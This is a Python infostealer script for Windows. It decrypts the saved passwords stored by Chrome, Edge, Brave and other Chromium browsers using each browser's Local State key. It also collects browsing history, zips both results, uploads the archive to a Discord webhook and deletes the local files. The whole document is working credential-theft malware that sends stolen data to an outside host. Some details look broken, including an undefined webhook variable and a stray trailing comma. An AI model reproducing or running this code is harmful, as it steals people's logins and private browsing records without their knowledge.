import os
import json
import base64
import sqlite3
import shutil
import requests
import zipfile
from Crypto.Cipher import AES
import win32crypt
def send_file_to_discord(file_path):
    with open(file_path, 'rb') as file:
        response = requests.post(
            webhook_url,
            files={'file': (os.path.basename(file_path), file)},
        )
        if response.status_code == 200:
            pass
        else:
            pass
def get_aes_key(browser_name, local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
def decrypt_password_chrome_edge_brave(encrypted_password, aes_key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(aes_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        pass
        return None
def fetch_login_details(browser_paths):
    try:
        with open("Logins.txt", "w", encoding="utf-8") as f:
            f.write("=== COMBINED BROWSER LOGIN DETAILS ===\n\n")
        for browser_name, paths in browser_paths.items():
            try:
                login_db_path = paths.get("login_data")
                local_state_path = paths.get("local_state")
                if browser_name in ["Chrome", "Edge", "Brave"] and login_db_path and local_state_path:
                    if not os.path.exists(login_db_path):
                        continue
                    temp_path = f"temp_{browser_name.lower()}_logins.db"
                    shutil.copyfile(login_db_path, temp_path)
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    query = """
                    SELECT origin_url, username_value, password_value
                    FROM logins
                    """
                    cursor.execute(query)
                    aes_key = get_aes_key(browser_name, local_state_path)
                    with open("Logins.txt", "a", encoding="utf-8") as f:
                        f.write(f"=== {browser_name.upper()} LOGIN DETAILS ===\n\n")
                        for row in cursor.fetchall():
                            origin_url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            password = decrypt_password_chrome_edge_brave(encrypted_password, aes_key)
                            f.write("=" * 80 + "\n")
                            f.write(f"Browser: {browser_name}\n")
                            f.write(f"Origin URL: {origin_url}\n")
                            f.write(f"Username: {username}\n")
                            f.write(f"Password: {password}\n")
                            f.write("=" * 80 + "\n\n")
                    conn.close()
                    os.remove(temp_path)
                elif browser_name == "Firefox":
                    pass
            except sqlite3.Error as e:
                pass
            except Exception as e:
                pass
    except Exception as e:
        pass
def fetch_browser_history(browser_paths):
    try:
        with open("History.txt", "w", encoding="utf-8") as f:
            f.write("=== COMBINED BROWSER HISTORY ===\n\n")
        for browser_name, paths in browser_paths.items():
            try:
                history_path = paths.get("history")
                if browser_name == "Firefox" and history_path:
                    if os.path.exists(history_path):
                        profiles = [f for f in os.listdir(history_path) if f.endswith('.default')]
                        if profiles:
                            history_path = os.path.join(history_path, profiles[0], 'places.sqlite')
                if not os.path.exists(history_path):
                    continue
                temp_path = f"temp_{browser_name.lower()}_history.db"
                with open(history_path, 'rb') as src:
                    with open(temp_path, 'wb') as temp_file:
                        temp_file.write(src.read())
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                if browser_name == "Firefox":
                    query = """
                    SELECT url,
                           datetime(last_visit_date/1000000, 'unixepoch') AS last_visit,
                           visit_count
                    FROM moz_places
                    WHERE last_visit_date IS NOT NULL
                    ORDER BY last_visit_date DESC;
                    """
                else:
                    query = """
                    SELECT urls.url,
                           datetime(urls.last_visit_time / 1000000 - 11644473600, 'unixepoch') AS last_visit,
                           urls.visit_count
                    FROM urls
                    ORDER BY last_visit DESC;
                    """
                cursor.execute(query)
                with open("History.txt", "a", encoding="utf-8") as f:
                    f.write(f"=== {browser_name.upper()} HISTORY ===\n\n")
                    for row in cursor.fetchall():
                        url = row[0].replace("https://", "").replace("http://", "")
                        date = row[1]
                        visits = row[2]
                        f.write("=" * 80 + "\n")
                        f.write(f"Browser: {browser_name}\n")
                        f.write(f"URL: {url}\n")
                        f.write(f"Last Visited: {date}\n")
                        f.write(f"Visit Count: {visits}\n")
                        f.write("=" * 80 + "\n\n")
                conn.close()
                os.remove(temp_path)
            except sqlite3.Error as e:
                pass
            except Exception as e:
                pass
        fetch_login_details(browser_paths)
    except Exception as e:
        pass
def zip_files():
    with zipfile.ZipFile("Browsers.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
        zipf.write("Logins.txt")
        zipf.write("History.txt")
browser_paths = {
    "Chrome": {"history": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")},
    "Edge": {"history": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")},
    "Brave": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")},
    "Firefox": {"history": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"), "login_data": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default-release\\LoginData"), "local_state": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default-release\\Local State")},
    "Opera": {"history": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"), "login_data": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State")},
    "Vivaldi": {"history": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Local State")},
    "Yandex": {"history": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State")},
    "Opera GX": {"history": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Local State")},
    "Brave": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")},
    "Avast": {"history": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Local State")},
    "Brave Nightly": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Local State")},
    "Brave Beta": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Local State")},
    "Chromium": {"history": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Local State")}
    },
fetch_browser_history(browser_paths)
zip_files()
send_file_to_discord("Browsers.zip")
os.remove("Logins.txt")
os.remove("History.txt")
os.remove("Browsers.zip")
